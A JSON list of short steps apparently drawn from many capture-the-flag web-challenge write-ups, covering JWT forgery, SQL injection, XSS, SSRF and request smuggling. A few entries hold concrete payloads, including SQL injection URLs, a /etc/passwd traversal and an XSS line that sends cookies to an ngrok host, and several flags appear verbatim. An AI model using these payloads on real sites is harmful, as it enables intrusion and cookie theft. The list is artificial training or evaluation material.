[
    "Confirmed server-side file inclusion.",
    "Discorded 'robots.txt' file at '?file=robots.txt'.",
    "Monitor the response for headers.",
    "Include the correct 'Authorization' header.",
    "Use the new token for authentication.",
    "Use only the first five elements of the array to create the file name",
    "The file name resolves to flag.txt after the process",
    "Read the information about 'Brobot' in the 'index.html' file",
    "Understand the information as a hint towards 'robots.txt'",
    "Realize it is similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]'",
    "Test CSS injection",
    "Create a signed cookie in the browser.",
    "Access the website's source code",
    "Observe the image",
    "Locate the 'Host' header in the HTTP request.",
    "Set the 'Host' as 'dscvit.com'.",
    "Set the cookie as 'user=root'.",
    "Add a JSON object '{\"foo\":\"bar\"}' to the body.",
    "Set the cookie to a given string",
    "Identified the new flag value in the response",
    "Identified a different flag value in the response",
    "This solution works for the 'Gate Keeper' challenge as well.",
    "The data content for the request is constructed dynamically with a key-value pair.",
    "The value for the key-value pair is the payload.",
    "Used a known attribute in the object",
    "Discover a template injection vulnerability.",
    "Identify a meta tag with the name attribute 'redpwnctf2020' in the HTML source code.",
    "Retrieve the value of the content attribute from the identified meta tag.",
    "Inject a random '<h1>Hello</h1>' tag.",
    "Encode the payload in base64.",
    "Submit the crafted URL to the Admin Bot.",
    "Utilize the specified attributes to redirect.",
    "Assign the document's cookie to the query parameter of a specified URL.",
    "Include the XSS payload in the URL.",
    "Intercept the bot's browser cookie.",
    "Wait for the bot to visit the sabotaged webpage.",
    "View the homepage source",
    "Receive a gif in response",
    "Verify that an 'upload' page is mentioned in the challenge description",
    "Decode the copied JWT token using a website like jwt.io.",
    "Identify the id of the newly created user from the received user list.",
    "Site has a login screen.",
    "Received a link to the running instance of the challenged web project.",
    "Confirm the ability to upload TPL files.",
    "Explored the site using ZAP Proxy.",
    "Identified /login and /forgotpassword.html as especially interesting.",
    "Identify the presence of a form to create users.",
    "Identify the indication of whether users are admins.",
    "Retrieve the flag using the customized request.",
    "Revealed current directory as '/var/www/html'.",
    "Listed environment variables.",
    "Attempt to open the 'robots.txt' file.",
    "Planned to execute 'curl http://localhost:3000/get_flag' to obtain output through the webpage.",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "Select the generated barcode file for upload.",
    "Locate the flag within the results.",
    "Read index.html.",
    "Isolate the '/' character.",
    "Build the path to the flag.",
    "Input {{ state }}",
    "View the HTML source code of the website",
    "Encounter a login page.",
    "Use the new session cookie to log into the site.",
    "Input the new cookie.",
    "Search for Robots.txt file.",
    "Inspect website's code.",
    "Discover admin login page.",
    "Perform login.",
    "Receive cookie as a result of successful login.",
    "Discovered a suspicious 'data' parameter in the URL.",
    "Read the information about logging in via POST and using json request",
    "Accessed the robots.txt file of the website",
    "Identified the '/flag' endpoint in the robots.txt file",
    "Included the newly edited admin jwt token in the request",
    "View the login form",
    "Use the newly generated token as a cookie",
    "Found a `token` cookie.",
    "Checked the value of the `token` cookie on jwt.io.",
    "Accessed the `/robots.txt` file.",
    "Found a public key in the `/robots.txt` file.",
    "Set the token as a cookie.",
    "Retrieve the flag.",
    "Include the SQL injection payload in a complete request.",
    "Observe that the submission is accepted.",
    "Use each character as the value for both 'pass' and the User-Agent header",
    "Observe the presence of a login form",
    "Identify a cookie named 'admin_id : 0'",
    "Locate the 'admin_id' cookie",
    "Observe the flag after refreshing the page",
    "Extract the flag from the HTML content of the response",
    "Observe within the content of the page.",
    "Identify the 'secret' tag which contains the flag.",
    "Attempted to induce an SQL injection by inputting the URL 'https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271'.",
    "Included the payload in the URL.",
    "Included the new payload in the URL.",
    "Ensure the payload visualizes and reads contents of 'flag.php'.",
    "Discover 'scriptlet' endpoint",
    "Set the value of the header 'answer' as 'Fear the Old Blood'",
    "Include a calculation statement in the request",
    "Tried a wrong HTTP verb.",
    "Took note of the different server requests that were sent as a result.",
    "Note that the number of pages is shown",
    "Deduced that two different strings should give the same md5 hash.",
    "Discover that the guest sign in portal is not implemented",
    "Craft a valid JWT with '31337' identity",
    "Include the crafted JWT in the `Authorization` header",
    "Recognize the potential CSRF vulnerability based on the CSRF token.",
    "Ensure the known username 'true.grit@umbccd.io' remains intact in the manipulated request.",
    "Check the cookies being set.",
    "Decode the ASCII representation to readable text using JavaScript console",
    "Observe that comments under a picture can be inserted.",
    "Step 1: Insert the comment as a preview.",
    "Attempt authentication with the user created.",
    "Flag found: 'OOO{did you see my dog}'.",
    "Examined the functionality endpoint '/files/'.",
    "Crafted a malicious HTTP request.",
    "Included a special character between 'Transfer-Encoding:' and 'chunked'.",
    "Bypassed localhost address checks by setting the '$url' attribute to 'file:///var/www/html/config.php'.",
    "Circumvented file extension checks on '.php' by replacing '.' character with '%252e'.",
    "Manipulate the HTML structure",
    "Create an insertion point",
    "Create a secondary note",
    "Pass the malicious note_id from the previous step",
    "Find the 'robots.txt' file",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts'",
    "Checked the category and points of the challenge. It was a web category and was worth 1783 points.",
    "Identified an authentication form on the webpage.",
    "Found an interesting comment in the HTML source code: '?sauce'.",
    "Review the presented source code",
    "Pass serialized input via 'id' HTTP GET parameter",
    "Pass payload as parameter",
    "Notice that the form allows execution of a ping command.",
    "Note the session info",
    "Use the modified cookie",
    "Passed an arbitrary character(',') into the X-FORWARDED-FOR HTTP header.",
    "Use 'cd S3Scanner/'",
    "Use 'cd buckets/bucketsoffun-ctf/'",
    "Receive a message that this page is for authentication with an API located at port 4000.",
    "Receive an error: Forbidden, missing JWT authorization.",
    "Receive a JWT(token).",
    "Discover a comment from the API documentation page's HTML source hinting about a robots.txt file located at http://ctfchallenges.ritsec.club:3000/robots.txt.",
    "Identify additional pages: upload.php and photos.php",
    "Attempt to access common pages like foo.php.",
    "Note that the server response includes the author of the feedback.",
    "Recognize that the username taken from the session is not properly sanitized",
    "Login with the registered user once",
    "Logout",
    "Re-login",
    "Identified that the blog owner has preference for Canonical and Bazaar.",
    "Received a 'HTTP 403 Forbidden' error, suggesting the '.bzr' directory's presence.",
    "Determine that the certificate seems invalid.",
    "Observe the flag displayed on the website.",
    "Web page performs a password reset function using security questions",
    "Confirm that the URL is a file sharing site",
    "Inspect how the website stores the 'name' parameter",
    "Retrieve the flag from the refreshed webpage",
    "Login using the found password.",
    "Analyze the webpage's HTML and JavaScript code.",
    "Craft an HTTP request.",
    "Target the chat endpoint.",
    "Get HTTP `403 Forbidden` response.",
    "Examine the source code of the main web page.",
    "Discover the usage of XML envelopes",
    "Identify the use of a productId value",
    "Observe the server reflecting the productId value in the response",
    "Observe that the server reflects the passed productId value in the response.",
    "Discovered an interesting comment with the parameter '?source=1'.",
    "Retrieved the PHP source code.",
    "Retrieved the PHP source code.",
    "Tried to enumerate DB tables.",
    "Noticed that an idea can be posted with an assigned ID.",
    "Understood the idea can be voted on.",
    "Examined the HTML source code.",
    "Include the payload in the request.",
    "Observe the presence of three files on the webpage.",
    "Tried to bypass Content Security Policy (CSP)",
    "Attempted to inject XSS after bypassing",
    "Identified the presence of protected DIG records.",
    "Discover that the web app is running in debug mode.",
    "Realize that the endpoint can be accessed without authentication.",
    "The encoded XMLHttpRequest retrieves document's cookie.",
    "Wait for the bot to visit the URL.",
    "The execution of '.bashrc' occurs when the user 'manhndd' SSH-es into the server",
    "Analyse the given hyperlinks.",
    "Identify that nginx concatenates alias directives with location directives.",
    "Trigger the XSS alert attack using the final URL.",
    "Identified it's a Web category challenge.",
    "The third payload ends up triggering an alert.",
    "Identify the reason for the failure as JavaScript trying to parse parentheses",
    "Used the profile picture upload feature",
    "Performed SSRF to rabbitmq http API",
    "Recognize the tripcode as 'ueyUrcwA'",
    "Observe that the system environment flag is displayed when the response contains the specific IP address (119.29.29.29).",
    "Run arbitrary javascript with the 'outputFunctionName' option",
    "Bypassed duration check",
    "Accessed the URL `http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b` to execute the injection attack.",
    "Bypass the X-Real-IP protection.",
    "Uploaded the first created PDF file to the website.",
    "Used the website functionality to get the uploaded PDF file signed.",
    "Log in to investigate any intermediate requests.",
    "Observed that the source code of the site became visible.",
    "Realized SQL queries can be dispatched to this open FD to read responses.",
    "Recognized the necessity to write a php-cgi header before executing the MySQL query.",
    "Waited and read the response as it came in.",
    "Used wordplay in the answers.",
    "Submitted the flag.",
    "Cause the pop-up to inherit the sandboxed attributes",
    "Set the origin as the target URL",
    "Display current cookies",
    "Query the protection of the website by CSRF tokens.",
    "Find out that the website isn't protected by CSRF tokens but employs SameSite=Lax cookies.",
    "Insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "Determine the payload to be inserted.",
    "Insert the payload which is a URL that generates a password change request for the admin account when clicked.",
    "Include multiple script tags",
    "Inject the authenticated session cookie into the browser or curl.",
    "Use 'flag.flag' as the 'id' to purchase the flag from the store for $1.",
    "Login to the website",
    "Register an account on the website",
    "Edit the user profile on the website",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "Resulted in 'Wrong Referrer' error",
    "Observe functionalities for login/register, edit profile, and support",
    "Observe the 'User-Agent header' and note the admin uses 'Firefox 61.0'",
    "Understand that the input format for the SQL injection should match the UUID format.",
    "Bypass the restriction caused by the referrer header.",
    "Add the attacker's email to the admin's shared list.",
    "Try different versions of the Twitter login page.",
    "Caused Apache2 to crash due to ':' in directory name.",
    "Had the right PHPSESSID in cookies.",
    "Used distinct virtual hosts and shell wildcards for the same result.",
    "Used %-decodes strings to match the '/debug/answer' endpoint.",
    "Performed a simple curl request to '/\\%64ebug/answer'.",
    "Determined the challenge requires bypassing an Angular application setup behind an Nginx reverse proxy.",
    "'req.ip' always pointed to the same IP address of the reverse proxy.",
    "Observed the application displaying contents of '/api/answer'.",
    "Understood this was done server-side.",
    "Successfully bypassed restrictions.",
    "Identified that the challenge seemed to involve reCAPTCHA.",
    "Manipulated the `statusCode` using the injected buttons.",
    "Ensure the request is made from the localhost.",
    "Proceed to send a GET request to the provided URL if the IP is not private.",
    "Intercept the data.",
    "Manipulate the intercepted data using burpsuite.",
    "Bypass the front end input sanitization.",
    "Recognize the potential involvement of code str_replace in changing language.",
    "Send the content of flag.txt to a webhook.",
    "Observe login page with no additional information.",
    "Successfully extract the user.",
    "Successfully extract the password token.",
    "Suggested that the 'shell_exec' function is running.",
    "Notice an option to register a new account.",
    "Generate an introspection query for graphql.",
    "The introspection query returns all the content of a graphql schema.",
    "Visualize the data structure using the graphql voyager tool.",
    "Retrieve the flag from the server's response",
    "Discover a new path /server-status",
    "Retrieve the flag value 'flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}'.",
    "Change the cookie values: userID to 768 and username to 'admin'.",
    "Start at a login/register page.",
    "Understand how to modify user's profile and upload images.",
    "Try XSS payloads on different input fields.",
    "Report the HTML file link to trick admin into opening it.",
    "Embed the 'id' of the attacker's user in the request body.",
    "Send first GET request with 65534 empty spaces.",
    "Send second GET request with 65534 empty spaces.",
    "Include session ID in the request.",
    "Fill out registration form.",
    "Add 'account[role]' parameter with value 'admin'.",
    "Inject an address into the URL parameter.",
    "Find the flag inside the newly public gallery.",
    "Observed an interface that offered XML parsing as a service.",
    "Reviewed the XML return from the 'view XML' tab.",
    "Successfully extracted the flag from /var/www.",
    "Discover a Disallowed path /ingen/.",
    "Receive a list of pumps and their IDs.",
    "Receive a notice that the request body must be JSON.",
    "Update the timestamp in the POST request.",
    "Submit an integer value as the input in the web application.",
    "Note the showcasing of uploaded photos.",
    "Experiment with the session_id.",
    "When faced with a security check.",
    "Attempt to bypass it by loading image URLs directly.",
    "Identify that the site allows script tags with nonces as external resources.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "Analyzed the code of the website",
    "Identified that 'ctx.state.user' equals to the 'username' cookie",
    "Used '__proto__' as the username parameter",
    "Set the 'language' parameter to 'key' in the JSON data.",
    "Understand that \u2018SCRIPT_NAME\u2019 can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Access the subclass information",
    "Observe that 'admin' is replaced in the username field.",
    "Include the payload in the username parameter.",
    "Identify that Meteor is being used.",
    "Deduce that the '$ne' filter checks if the body of the notes is not empty.",
    "Recognize that it passes the extension check due to .txt extension.",
    "Indicate another possible server.",
    "Bypassed regex filters.",
    "Construct the URL 'http://10.8.201.87:5000/checkbalance?amount=${num}' using the queried amount.",
    "The iframe source is /demo",
    "Message is only sent to the intended receiver",
    "Data is POST-ed to the /api/filter endpoint",
    "XSS on the challenge server is necessitated",
    "Identify the request parameters of the /find endpoint: condition, startsWith, endsWith, and debug.",
    "Encode the cookie-characters as response headers.",
    "Generate URLs that set cookies with parts of manipulated JavaScript code.",
    "Craft a request to '/post.php?post=../../../../../../etc/passwd'.",
    "Constructed a CL-TE request smuggling attack.",
    "Noticed the presence of file upload capability.",
    "Analyze the data being displayed",
    "Inject a final cookie.",
    "Name the cookie 'admin'.",
    "Use the manipulated cookies to gain access.",
    "Uploaded the .php16 file.",
    "Use the crafted query to access the admin console via internal request.",
    "Look for a value for 'confidential_documents'.",
    "Unlock the flag and source code using the uploaded PDFs.",
    "Extract the text before the period (.) from the Flask session cookie.",
    "Uploaded the final payload to the server.",
    "Used the same request to read the flag from the '/readflag' binary.",
    "Ran '/readflag' by passing it as an argument to the defined 'pwn' function.",
    "Authenticated as admin and explored login.php",
    "Received a 403 Forbidden error from the login.php page.",
    "Gained access to the login page.",
    "Identified fields labeled 'username' and 'password'.",
    "Verified it returns data for user ID 1.",
    "Utilized SQLMap targeting 'login.php' page.",
    "Analyze the form submission structure",
    "Examined how the note taking app functions.",
    "Noted that 'y.png' loads if the query is found within a note.",
    "Noted that 'n.png' loads if the query is not found within a note.",
    "Observed the attack working even with Chrome's cache partitioning policy.",
    "Recognize the usage of Flask's 'render_template_string' function",
    "Notice that files with commonly used extensions are downloaded.",
    "Notice that .html files are rendered inline.",
    "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
    "Verified this by submitting HTML enclosed in script tags to catch the HTTP request.",
    "Payload 1: Obtained the full URL of the browsing context.",
    "Payload 2: Obtained the page contents.",
    "Found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Read the flag using the established reverse shell.",
    "Guess that the server was using FastAPI.",
    "Note that the Go microservice uses the Beego web framework",
    "Reach the 'Put()' handler of the Go microservice",
    "Note that Flask's built-in server can be susceptible to HTTP request smuggling attacks due to its insecure nature",
    "Note that the Flask server treats underscores ('_') as hyphens ('-')",
    "Note that the Flask server allows duplicate 'Content-Length' headers",
    "Take advantage of the Flask server's failure to comply with RFC norms",
    "Convince the server to communicate with arbitrary URL.",
    "Convert your public IP address to octal form using an octal IP address converter.",
    "Assume the application is likely behind AWS WAF.",
    "Caused the proxy server to send a request to the specified URL.",
    "Note that the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Registered a new account.",
    "Noted that the `/api/token` endpoint returns the current authentication token.",
    "Identified the specified `apiGet` URL.",
    "Send GET requests with incrementing 'id' using the script.",
    "Verify that the WebSocket client's origin starts with 'http://localhost'.",
    "Set the authentication cookie for the victim using JavaScript.",
    "Ensure the completion of navigation and placement of the cookie by sleeping for 1 second.",
    "Understand that the Origin request header cannot be modified by JavaScript.",
    "Consider the possibility of exploiting a browser zero-day to spoof Origin headers.",
    "Set the auth token by making the bot visit 'http://localhost:7070/auth'.",
    "Check the 'Content-length' response header",
    "Observed any unusual behavior",
    "The task of this payload is to exfiltrate the content from `http://localhost:5000/admin`",
    "Demonstrated DOM clobbering.",
    "Enabled 'enable_experimental_features'.",
    "Confirmed the possibility of creating a new repository with a CNAME file containing 'asdf.jsapi.tech'.",
    "Examined the Content-Security-Policy (CSP) of the site.",
    "Identified the allowance of loading stylesheets from '*.jsapi.tech'.",
    "Realized that this allows loading of a CSS file from the exploit domain.",
    "Observed the usage of 'asdf<link rel='stylesheet' href='...'>'.",
    "Identified the 'data-last' attribute of the '#note-text-area' element.",
    "Bypassed the validation by using a different case.",
    "Obtained the flag.",
    "Included 'GET /flag HTTP/1.1' in the request body.",
    "Set 'Content-Length: 0' for the first request.",
    "Ensured the modifications reflected the initial intention.",
    "The request smuggling caused the difference in the response.",
    "Exploited the limit of 20 redirects using Fetch API.",
    "Insert '__proto__' attribute in the request payload.",
    "Used the appropriate 'X-Cat-Header' in the request",
    "Discover that all other endpoints are protected by authenticationMiddleware.",
    "Note that the relative paths now load scripts from the attacker's server.",
    "Find the public key in '/signature/key.pub' as indicated in the hint.",
    "Noted that the post is only visible to the admin.",
    "Injected arbitrary HTML through HTML comments.",
    "Identified a potential vulnerability with 'www.youtube.com' hosting a JSONP endpoint.",
    "Found an issue on Google's issue tracker regarding YouTube's 'oembed' API not implementing JSONP.",
    "Provided a callback parameter.",
    "Injected arbitrary Javascript to exfiltrate contents from admin's page.",
    "Notice that the resources are fetched from '/ajax/articles?cat=news'.",
    "Observe that the fetched resources are inserted into the 'ajax-load' element.",
    "Attempt to inject an attribute into the 'img' element of the response.",
    "Create the final payload: '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img'",
    "The attack starts with executing an XSS to grant admin privileged access",
    "Capture the request, including the Admin-Key.",
    "Performed an SSRF.",
    "Take note of the Nginx configuration",
    "Understand that the mechanism can be bypassed using 'username:password@hostname' URL format",
    "Use the custom host header to target your own host"
]